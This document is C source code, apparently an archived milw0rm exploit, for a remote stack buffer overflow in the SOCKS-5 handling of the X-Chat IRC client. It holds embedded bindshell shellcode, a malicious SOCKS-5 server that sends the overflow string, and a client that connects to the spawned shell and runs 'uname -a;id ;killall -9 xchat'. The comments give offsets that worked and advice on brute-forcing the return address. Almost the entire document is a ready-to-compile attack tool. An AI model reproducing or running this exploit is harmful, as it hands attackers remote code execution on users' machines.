/*[ X-Chat[v1.8.0 - v2.0.8]: socks-5 remote buffer overflow exploit. ]                         *
 *                                                                                                                        *
 * by: vade79/v9 v9 fakehalo deadpig org (fakehalo/realhalo)                                   *
 *                                                                                                                        *
 * X-Chat homepage:                                                                                            *
 *  http://www.xchat.org                                                                                         *
 *                                                                                                                        *
 * compile:                                                                                                           *
 *  cc xxchat-socks5.c -o xxchat-socks5                                                                   *
 *                                                                                                                        *
 * trigger bug/workings(X-Chat socks-5 comminucation):                                           *
 *  0x05,0x00                                                                                                       *
 *  0x05,0x00,0x00,0x03                                                                                       *
 *  0x?? (the size of the following "data", 255MAX(char/int8))                                     *
 *  0x??,0x??,0x?? ... ("data")                                                                                *
 *                                                                                                                        *
 *  ie. "\x05\x00\x05\x00\x00\x03\xffxxxxxxxxxxxxxxxxxxxxxxxxxxxx..."               *
 *                                                                                                                        *
 * the "data", limited by the previous byte, is then copied into a                                 *
 * 10 byte buffer labeled buf[].  the idea is to set the size of                                     *
 * the incoming data to a larger size than expected(ie. 0xff/255MAX),                         *
 * followed by sending that amount of data to exceed the 10 byte                              *
 * buffer boundary and overwrite memory addresses(stack based).                             *
 *                                                                                                                        *
 * the problem with the size limit is that it is defined in one                                        *
 * character(char/int8), making a maximum of up to 255 bytes to be                          *
 * written to buf[].  so, this only leaves about ~100+ nops breathing                           *
 * room per offset.  another problem is that the location of the                                   *
 * shellcode depends on where/what X-Chat has already done.  those                          *
 * two things together make for a very unpractical "in the wild"                                    *
 * exploit scenario.                                                                                                *
 *                                                                                                                        *
 * i just saw several cryptic advisories about this bug, so i figured                                *
 * i would look into it and see exactly what it was.                                                      *
 *                                                                                                                        *
 * if X-Chat attempts to connect to a server(through socks-5)                                     *
 * immediately upon the start of X-Chat("autoconnect") it will make                            *
 * the shellcode location a bit easier to find.  on both source                                      *
 * compiled version 1.8.0(on rh7.1) and mandrake's rpm static binary                         *
 * version 2.0.5(on mdk9.1) an offset of 2600 worked.                                              *
 *                                                                                                                        *
 * note: the first thing that is sent to the bindshell, upon                                           *
 * successful exploitation, is "killall -9 xchat".  this will kill                                          *
 * X-Chat, but still keep the bindshell alive/active.  when searching                             *
 * for the correct offset, use increments of 100(100,200,300,...).                                *
 **********************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define BUFSIZE 255
#define BSEADDR 0xbffffffa
#define DFLPORT 1080
#define DFLSPRT 7979
#define TIMEOUT 5
static char x86_exec[]= /* bindshell(??), netric based. */
 "\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66"
 "\xcd\x80\x31\xd2\x52\x66\x68\x00\x00\x43\x66\x53\x89"
 "\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89"
 "\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52"
 "\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80"
 "\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68"
 "\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd"
 "\x80";
char *getcode(unsigned int);
char *socks5_bind(unsigned short,unsigned int);
void getshell(char *,unsigned short);
void printe(char *,short);
void sig_alarm(){printe("alarm/timeout hit.",1);}
int main(int argc,char **argv){
 unsigned short port=DFLPORT,sport=DFLSPRT;
 unsigned int retaddr=BSEADDR;
 char *hostptr;
 if(BUFSIZE<0||BUFSIZE>255)printe("BUFSIZE must be 1-255(char/int8).",1);
 printf("[*] X-Chat[v1.8.0-v2.0.8]: socks-5 remote buffer overflow exp"
 "loit.\n[*] by: by: vade79/v9 v9 fakehalo deadpig org (fakehalo)\n\n");
 if(argc<2){
  printf("[!] syntax: %s <offset from 0x%.8x> [port] [shell port]\n\n",
  argv[0],BSEADDR);
  exit(1);
 }
 if(argc>1)retaddr-=atoi(argv[1]);
 if(argc>2)port=atoi(argv[2]);
 if(argc>3)sport=atoi(argv[3]);
 x86_exec[20]=(sport&0xff00)>>8;
 x86_exec[21]=(sport&0x00ff);
 printf("[*] eip: 0x%.8x, socks-5 port: %u, bindshell port: %u.\n",
 retaddr,port,sport);
 hostptr=socks5_bind(port,retaddr);
 sleep(1);
 getshell(hostptr,sport);
 exit(0);
}
char *getcode(unsigned int retaddr){
 unsigned char i=0;
 char *buf;
 if(!(buf=(char *)malloc(BUFSIZE+1)))
  printe("getcode(): allocating memory failed.",1);
 memset(buf,0x90,BUFSIZE);
 for(i=0;i<64;i+=4){*(long *)&buf[i]=retaddr;}
 memcpy((buf+BUFSIZE-strlen(x86_exec)),x86_exec,strlen(x86_exec));
 return(buf);
}
char *socks5_bind(unsigned short port,unsigned int retaddr){
 int ssock=0,sock=0,so=1;
 socklen_t salen=0;
 unsigned char *buf;
 struct sockaddr_in ssa,sa;
 ssock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 setsockopt(ssock,SOL_SOCKET,SO_REUSEADDR,(void *)&so,sizeof(so));
#ifdef SO_REUSEPORT
 setsockopt(ssock,SOL_SOCKET,SO_REUSEPORT,(void *)&so,sizeof(so));
#endif
 ssa.sin_family=AF_INET;
 ssa.sin_port=htons(port);
 ssa.sin_addr.s_addr=INADDR_ANY;
 printf("[*] awaiting connection from: *:%d.\n",port);
 if(bind(ssock,(struct sockaddr *)&ssa,sizeof(ssa))==-1)
  printe("could not bind socket.",1);
 listen(ssock,2);
 bzero((char*)&sa,sizeof(struct sockaddr_in));
 salen=sizeof(sa);
 sock=accept(ssock,(struct sockaddr *)&sa,&salen);
 close(ssock);
 printf("[*] socks-5 server connection established.\n");
 if(!(buf=(unsigned char *)malloc(BUFSIZE+7+1)))
  printe("socks5_bind(): allocating memory failed.",1);
 memcpy(buf,"\x05\x00\x05\x00\x00\x03",6);
 buf[6]=BUFSIZE;
 memcpy(buf+7,getcode(retaddr),BUFSIZE);
 printf("[*] sending specially crafted string. (exploit)\n");
 write(sock,buf,BUFSIZE+7);
 free(buf);
 sleep(1);
 close(sock);
 printf("[*] socks-5 server connection closed.\n");
 return(inet_ntoa(sa.sin_addr));
}
void getshell(char *hostname,unsigned short port){
 int sock,r;
 fd_set fds;
 char buf[4096+1];
 struct hostent *he;
 struct sockaddr_in sa;
 printf("[*] checking to see if the exploit was successful.\n");
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
  printe("getshell(): socket() failed.",1);
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname)))
   printe("getshell(): couldn't resolve.",1);
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
  sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(port);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 printf("[*] attempting to connect: %s:%d.\n",hostname,port);
 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
  printf("[!] connection failed: %s:%d.\n",hostname,port);
  return;
 }
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n\n",hostname,port);
 signal(SIGINT,SIG_IGN);
 write(sock,"uname -a;id ;killall -9 xchat\n",30);
 while(1){
  FD_ZERO(&fds);
  FD_SET(0,&fds);
  FD_SET(sock,&fds);
  if(select(sock+1,&fds,0,0,0)<1)
   printe("getshell(): select() failed.",1);
  if(FD_ISSET(0,&fds)){
   if((r=read(0,buf,4096))<1)
    printe("getshell(): read() failed.",1);
   if(write(sock,buf,r)!=r)
    printe("getshell(): write() failed.",1);
  }
  if(FD_ISSET(sock,&fds)){
   if((r=read(sock,buf,4096))<1)
    exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}
void printe(char *err,short e){
 printf("[!] %s\n",err);
 if(e)exit(1);
 return;
}


// milw0rm.com [2004-05-05]
